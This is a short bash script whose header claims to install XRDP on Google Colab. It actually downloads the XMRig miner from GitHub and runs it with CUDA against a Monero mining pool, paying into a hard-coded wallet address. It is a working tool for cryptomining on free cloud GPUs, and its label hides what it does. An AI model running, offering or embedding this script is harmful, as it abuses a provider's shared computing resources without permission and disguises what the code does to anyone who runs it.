#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig --cuda -o us-west.minexmr.com:443 -u 41tHm16k3JnFWqcBWDDzWHZc9R6rxaTu77MLMCdwFkAgXERNDNaTS2eh6qMv54WmsL6F6kgqR2DFB9KixJeymYjdGnknKBb -k --tls --rig-id GC-US
